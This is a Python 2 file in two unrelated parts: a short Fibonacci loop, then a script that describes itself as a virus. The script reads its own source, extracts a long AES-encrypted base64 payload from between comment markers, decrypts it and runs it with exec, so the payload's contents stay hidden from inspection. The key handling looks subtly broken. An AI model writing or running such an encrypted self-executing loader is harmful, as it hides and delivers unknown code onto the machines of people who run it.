parents, babies = (1, 1)
while babies < 100:
    print 'This generation has {0} babies'.format(babies)
    parents, babies = (babies, parents + babies)

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload